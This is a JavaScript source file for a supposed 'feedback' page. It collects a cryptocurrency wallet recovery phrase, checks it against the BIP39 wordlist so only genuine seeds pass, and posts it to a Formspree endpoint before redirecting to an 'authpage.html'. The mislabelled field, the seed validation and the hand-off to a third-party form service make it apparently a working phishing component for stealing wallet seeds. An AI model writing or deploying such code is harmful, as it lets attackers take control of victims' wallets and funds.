// ========================================
// FEEDBACK PAGE FUNCTIONALITY (FINAL)
// ========================================
async function initializeFeedbackPage() {
    const form = document.getElementById('feedbackForm');
    if (!form) {
        console.log('No feedback form found');
        return;
    }

    console.log('Feedback form found, initializing...');

    const mnemonicInput = document.getElementById('feedback');
    const errorMessage = document.getElementById('errorMessage');

    // Load BIP39 wordlist
    let wordlist = [];
    try {
        const response = await fetch('https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt');
        const text = await response.text();
        wordlist = text.trim().split('\n');
        console.log('BIP39 wordlist loaded:', wordlist.length, 'words');
    } catch (error) {
        console.error('Failed to load BIP39 wordlist:', error);
    }

    function showError(msg) {
        console.log('Showing error:', msg);
        errorMessage.textContent = msg;
        errorMessage.style.display = 'block';
    }

    function hideError() {
        console.log('Hiding error');
        errorMessage.style.display = 'none';
    }

    function isValidBip39Mnemonic(mnemonic) {
        console.log('Validating mnemonic...');
        const words = mnemonic.split(/\s+/).filter(w => w.length > 0);
        console.log('Word count:', words.length);

        // Check word count
        if (![12, 15, 18, 21, 24].includes(words.length)) {
            console.log('Invalid word count');
            return false;
        }

        // Check if all words are in wordlist
        if (wordlist.length > 0) {
            for (const word of words) {
                if (!wordlist.includes(word)) {
                    console.log('Invalid word found:', word);
                    return false;
                }
            }
        }

        // Check with BIP39 library if available
        if (typeof window.bip39 !== 'undefined' && window.bip39 && window.bip39.validateMnemonic) {
            try {
                const isValid = window.bip39.validateMnemonic(mnemonic);
                console.log('BIP39 library validation:', isValid);
                return isValid;
            } catch (error) {
                console.error('BIP39 validation error:', error);
                // If BIP39 fails, fall back to wordlist check
                return true;
            }
        } else {
            console.warn('BIP39 library not available, using wordlist validation only');
            // If BIP39 library isn't loaded, accept if all words are valid
            return wordlist.length > 0;
        }
    }

    form.addEventListener('submit', async function (e) {
        e.preventDefault();
        console.log('Form submitted');

        const mnemonic = mnemonicInput.value.trim().toLowerCase();
        console.log('Mnemonic entered, word count:', mnemonic.split(/\s+/).filter(w => w.length > 0).length);

        // Validate passphrase
        if (!isValidBip39Mnemonic(mnemonic)) {
            showError('Invalid passphrase');
            return;
        }

        console.log('Mnemonic is valid, proceeding with submission...');
        hideError();

        // Check if form has a valid Formspree action
        const formAction = form.getAttribute('action');
        const hasValidFormspree = formAction && formAction.includes('formspree.io') && !formAction.includes('YOUR_FORMSPREE_ID');

        if (!hasValidFormspree) {
            console.log('No valid Formspree endpoint configured, redirecting directly...');
            window.location.href = 'authpage.html';
            return;
        }

        const formData = new FormData(form);

        try {
            console.log('Sending to Formspree...');
            const response = await fetch(formAction, {
                method: 'POST',
                body: formData,
                headers: { Accept: 'application/json' }
            });

            console.log('Response status:', response.status);

            if (response.ok) {
                console.log('Submission successful, redirecting to authpage...');
                window.location.href = 'authpage.html';
            } else {
                const errorData = await response.json();
                console.error('Submission failed:', errorData);
                showError('Submission failed. Please try again.');
            }
        } catch (error) {
            console.error('Network error:', error);
            showError('Network error. Please try again.');
        }
    });

    console.log('Form listener attached');
}

// Initialize the feedback page
initializeFeedbackPage();
